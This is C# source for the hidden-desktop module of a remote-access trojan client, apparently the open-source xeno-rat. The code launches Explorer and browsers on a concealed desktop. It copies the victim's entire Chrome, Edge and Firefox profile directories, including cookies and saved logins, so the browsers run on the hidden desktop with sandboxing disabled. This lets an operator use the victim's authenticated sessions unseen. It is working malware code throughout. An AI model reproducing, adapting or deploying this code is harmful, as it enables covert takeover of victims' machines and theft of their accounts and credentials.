using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using xeno_rat_client;

namespace Hidden_handler
{
    class Process_Handler
    {
        string DesktopName;
        public Process_Handler(string DesktopName) 
        {
            this.DesktopName = DesktopName;
        }
        [DllImport("kernel32.dll")]
        private static extern bool CreateProcess(
         string lpApplicationName,
         string lpCommandLine,
         IntPtr lpProcessAttributes,
         IntPtr lpThreadAttributes,
         bool bInheritHandles,
         int dwCreationFlags,
         IntPtr lpEnvironment,
         string lpCurrentDirectory,
         ref STARTUPINFO lpStartupInfo,
         ref PROCESS_INFORMATION lpProcessInformation);

        [StructLayout(LayoutKind.Sequential)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        public bool StartExplorer() 
        {
            uint neverCombine = 2;
            string valueName = "TaskbarGlomLevel";
            string explorerKeyPath = @"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced";
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(explorerKeyPath, true))
            {
                if (key != null)
                {
                    object value = key.GetValue(valueName);
                    if (value is uint regValue && regValue != neverCombine)
                    {
                        key.SetValue(valueName, neverCombine, RegistryValueKind.DWord);
                    }
                }
            }
            if (Utils.IsAdmin())
            {
                if (_ProcessHelper.RunAsRestrictedUser(@"C:\Windows\explorer.exe", DesktopName)) 
                {
                    return true;
                }
            }
            return CreateProc(@"C:\Windows\explorer.exe");
        }

        public string getChromePath()
        {

            var path = Registry.GetValue(@"HKEY_CLASSES_ROOT\ChromeHTML\shell\open\command", null, null) as string;
            if (path != null)
            {
                var split = path.Split('\"');
                path = split.Length >= 2 ? split[1] : null;
            }
            return path;
        }

        public string GetEdgePath()
        {
            string edgeRegistryPath = @"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\msedge.exe";

            using (RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey(edgeRegistryPath))
            {
                if (key != null)
                {
                    object edgePathObj = key.GetValue("");

                    if (edgePathObj != null)
                    {
                        return edgePathObj.ToString();
                    }
                }
            }

            return null;
        }
        public string GetFirefoxPath()
        {
            string firefoxRegistryPath = @"SOFTWARE\Mozilla\Mozilla Firefox";

            using (RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey(firefoxRegistryPath))
            {
                if (key != null)
                {
                    object firefoxPathObj = key.GetValue("CurrentVersion");

                    if (firefoxPathObj != null)
                    {
                        string currentVersion = firefoxPathObj.ToString();
                        string pathKey = $@"SOFTWARE\Mozilla\Mozilla Firefox\{currentVersion}\Main";

                        using (RegistryKey pathSubKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey(pathKey))
                        {
                            if (pathSubKey != null)
                            {
                                object pathValue = pathSubKey.GetValue("PathToExe");

                                if (pathValue != null)
                                {
                                    return pathValue.ToString();
                                }
                            }
                        }
                    }
                }
            }
            return null;
        }
        public bool StartChrome() 
        {
            string dataDir = @"C:\ChromeAutomationData";
            string path = getChromePath();
            if (path == null || !File.Exists(path)) 
            {
                return false;
            }
            return CreateProc("\"" + path + "\"" + " --no-sandbox --allow-no-sandbox-job --disable-gpu --user-data-dir="+dataDir);
        }

        public bool StartEdge()
        {
            string dataDir = @"C:\EdgeAutomationData";
            string path = GetEdgePath();
            if (path == null || !File.Exists(path))
            {
                return false;
            }
            return CreateProc("\"" + path + "\"" + " --no-sandbox --allow-no-sandbox-job --disable-gpu --user-data-dir=" + dataDir);
        }

        public bool StartFirefox()
        {
            string dataDir = @"C:\FirefoxAutomationData";
            string path = GetFirefoxPath();
            if (path == null || !File.Exists(path))
            {
                return false;
            }
            return CreateProc("\"" + path + "\"" + " -no-remote -profile " + dataDir);
        }

        public async Task<bool> CloneChrome()
        {
            try
            {
                string dataDir = @"C:\ChromeAutomationData";
                string source = $@"C:\Users\{Environment.UserName}\AppData\Local\Google\Chrome\User Data";
                if (Directory.Exists(dataDir))
                {
                    await Task.Run(() => Directory.Delete(dataDir, true));
                    Directory.CreateDirectory(dataDir);
                }
                else
                {
                    Directory.CreateDirectory(dataDir);
                }
                await CopyDirAsync(source, dataDir);
                return true;

            }
            catch { }
            return false;
        }

        public async Task<bool> CloneFirefox()
        {
            try
            {
                string profilesPath = $@"C:\Users\{Environment.UserName}\AppData\Roaming\Mozilla\Firefox\Profiles";
                string fileInDirectory = "addons.json";
                string source = RecursiveFileSearch(profilesPath, fileInDirectory);
                if (source == null)
                {
                    return false;
                }
                string dataDir = @"C:\FirefoxAutomationData";
                if (Directory.Exists(dataDir))
                {
                    await Task.Run(() => Directory.Delete(dataDir, true));
                    Directory.CreateDirectory(dataDir);
                }
                else
                {
                    Directory.CreateDirectory(dataDir);
                }
                await CopyDirAsync(source, dataDir);
                return true;

            }
            catch { }
            return false;
        }

        public async Task<bool> CloneEdge()
        {
            try
            {
                string dataDir = @"C:\EdgeAutomationData";
                string source = $@"C:\Users\{Environment.UserName}\AppData\Local\Microsoft\Edge\User Data";
                if (Directory.Exists(dataDir))
                {
                    await Task.Run(() => Directory.Delete(dataDir, true));
                    Directory.CreateDirectory(dataDir);
                }
                else
                {
                    Directory.CreateDirectory(dataDir);
                }
                await CopyDirAsync(source, dataDir);
                return true;

            }
            catch { }
            return false;
        }

        static string RecursiveFileSearch(string currentDirectory, string targetFileName)
        {
            string targetFilePath = Path.Combine(currentDirectory, targetFileName);
            if (File.Exists(targetFilePath))
            {
                return currentDirectory;
            }
            foreach (string subdirectory in Directory.GetDirectories(currentDirectory))
            {
                string result = RecursiveFileSearch(subdirectory, targetFileName);
                if (result != null)
                {
                    return result;
                }
            }
            return null;
        }
        public async Task CopyDirAsync(string sourceDir, string destinationDir)
        {
            await CopyDirectoriesAsync(sourceDir, destinationDir);

            IEnumerable<string> files = Directory.EnumerateFiles(sourceDir, "*", SearchOption.AllDirectories);
            await CopyFilesInParallelAsync(files, sourceDir, destinationDir, maxParallelism: 10); // Set your desired parallelism limit
        }

        private async Task CopyDirectoriesAsync(string sourceDir, string destinationDir)
        {
            IEnumerable<string> directories = Directory.EnumerateDirectories(sourceDir, "*", SearchOption.AllDirectories);

            foreach (string dir in directories)
            {
                string relativePath = dir.Substring(sourceDir.Length + 1);
                string destinationPath = Path.Combine(destinationDir, relativePath);

                await Task.Run(() => Directory.CreateDirectory(destinationPath));
            }
        }

        private static async Task CopyFilesInParallelAsync(IEnumerable<string> files, string sourceDir, string destinationDir, int maxParallelism)
        {
            var semaphore = new SemaphoreSlim(maxParallelism);

            async Task CopyFileAsync(string filePath)
            {
                string relativePath = filePath.Substring(sourceDir.Length + 1);
                string destinationPath = Path.Combine(destinationDir, relativePath);

                try
                {
                    await semaphore.WaitAsync();
                    await Task.Run(() => File.Copy(filePath, destinationPath, true));
                }
                finally
                {
                    semaphore.Release();
                }
            }

            var copyTasks = files.Select(CopyFileAsync).ToArray();

            await Task.WhenAll(copyTasks);
        }

        public bool CreateProc(string filePath)
        {
            STARTUPINFO si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(si);
            si.lpDesktop = DesktopName;
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            bool resultCreateProcess = CreateProcess(
                null,
                filePath,
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                48,
                IntPtr.Zero,
                null,
                ref si,
                ref pi);
            return resultCreateProcess;
        }
    }
    class _ProcessHelper
    {

        //thanks to oz solomon
        //https://stackoverflow.com/questions/11169431/how-to-start-a-new-process-without-administrator-privileges-from-a-process-with
        public static bool RunAsRestrictedUser(string fileName, string DesktopName)
        {
            if (string.IsNullOrWhiteSpace(fileName))
                throw new ArgumentException("Value cannot be null or whitespace.", nameof(fileName));

            if (!GetRestrictedSessionUserToken(out var hRestrictedToken))
            {
                return false;
            }

            try
            {
                var si = new STARTUPINFO();
                si.cb = Marshal.SizeOf(si);
                si.lpDesktop = DesktopName;
                var pi = new PROCESS_INFORMATION();
                var cmd = new StringBuilder();
                cmd.Append(fileName);

                if (!CreateProcessAsUser(
                    hRestrictedToken,
                    null,
                    cmd,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    true,
                    0,
                    IntPtr.Zero,
                    Path.GetDirectoryName(fileName),
                    ref si,
                    out pi))
                {
                    return false;
                }

                return true;
            }
            finally
            {
                CloseHandle(hRestrictedToken);
            }
        }
        private static bool GetRestrictedSessionUserToken(out IntPtr token)
        {
            token = IntPtr.Zero;
            if (!SaferCreateLevel(SaferScope.User, SaferLevel.NormalUser, SaferOpenFlags.Open, out var hLevel, IntPtr.Zero))
            {
                return false;
            }

            IntPtr hRestrictedToken = IntPtr.Zero;
            TOKEN_MANDATORY_LABEL tml = default;
            tml.Label.Sid = IntPtr.Zero;
            IntPtr tmlPtr = IntPtr.Zero;

            try
            {
                if (!SaferComputeTokenFromLevel(hLevel, IntPtr.Zero, out hRestrictedToken, 0, IntPtr.Zero))
                {
                    return false;
                }
                tml.Label.Attributes = SE_GROUP_INTEGRITY;
                tml.Label.Sid = IntPtr.Zero;
                if (!ConvertStringSidToSid("S-1-16-8192", out tml.Label.Sid))
                {
                    return false;
                }

                tmlPtr = Marshal.AllocHGlobal(Marshal.SizeOf(tml));
                Marshal.StructureToPtr(tml, tmlPtr, false);
                if (!SetTokenInformation(hRestrictedToken,
                    TOKEN_INFORMATION_CLASS.TokenIntegrityLevel,
                    tmlPtr, (uint)Marshal.SizeOf(tml)))
                {
                    return false;
                }

                token = hRestrictedToken;
                hRestrictedToken = IntPtr.Zero;
            }
            finally
            {
                SaferCloseLevel(hLevel);
                SafeCloseHandle(hRestrictedToken);
                if (tml.Label.Sid != IntPtr.Zero)
                {
                    LocalFree(tml.Label.Sid);
                }
                if (tmlPtr != IntPtr.Zero)
                {
                    Marshal.FreeHGlobal(tmlPtr);
                }
            }

            return true;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct SID_AND_ATTRIBUTES
        {
            public IntPtr Sid;
            public uint Attributes;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct TOKEN_MANDATORY_LABEL
        {
            public SID_AND_ATTRIBUTES Label;
        }

        public enum SaferLevel : uint
        {
            Disallowed = 0,
            Untrusted = 0x1000,
            Constrained = 0x10000,
            NormalUser = 0x20000,
            FullyTrusted = 0x40000
        }

        public enum SaferScope : uint
        {
            Machine = 1,
            User = 2
        }

        [Flags]
        public enum SaferOpenFlags : uint
        {
            Open = 1
        }

        [DllImport("advapi32", SetLastError = true, CallingConvention = CallingConvention.StdCall)]
        private static extern bool SaferCreateLevel(SaferScope scope, SaferLevel level, SaferOpenFlags openFlags, out IntPtr pLevelHandle, IntPtr lpReserved);

        [DllImport("advapi32", SetLastError = true, CallingConvention = CallingConvention.StdCall)]
        private static extern bool SaferComputeTokenFromLevel(IntPtr LevelHandle, IntPtr InAccessToken, out IntPtr OutAccessToken, int dwFlags, IntPtr lpReserved);

        [DllImport("advapi32", SetLastError = true)]
        private static extern bool SaferCloseLevel(IntPtr hLevelHandle);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern bool ConvertStringSidToSid(string StringSid, out IntPtr ptrSid);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CloseHandle(IntPtr hObject);

        private static bool SafeCloseHandle(IntPtr hObject)
        {
            return (hObject == IntPtr.Zero) ? true : CloseHandle(hObject);
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr LocalFree(IntPtr hMem);

        enum TOKEN_INFORMATION_CLASS
        {
            TokenUser = 1,
            TokenGroups,
            TokenPrivileges,
            TokenOwner,
            TokenPrimaryGroup,
            TokenDefaultDacl,
            TokenSource,
            TokenType,
            TokenImpersonationLevel,
            TokenStatistics,
            TokenRestrictedSids,
            TokenSessionId,
            TokenGroupsAndPrivileges,
            TokenSessionReference,
            TokenSandBoxInert,
            TokenAuditPolicy,
            TokenOrigin,
            TokenElevationType,
            TokenLinkedToken,
            TokenElevation,
            TokenHasRestrictions,
            TokenAccessInformation,
            TokenVirtualizationAllowed,
            TokenVirtualizationEnabled,
            TokenIntegrityLevel,
            TokenUIAccess,
            TokenMandatoryPolicy,
            TokenLogonSid,
            MaxTokenInfoClass
        }

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern Boolean SetTokenInformation(
            IntPtr TokenHandle,
            TOKEN_INFORMATION_CLASS TokenInformationClass,
            IntPtr TokenInformation,
            UInt32 TokenInformationLength);

        const uint SE_GROUP_INTEGRITY = 0x00000020;

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern bool CreateProcessAsUser(
            IntPtr hToken,
            string lpApplicationName,
            StringBuilder lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);
    }
}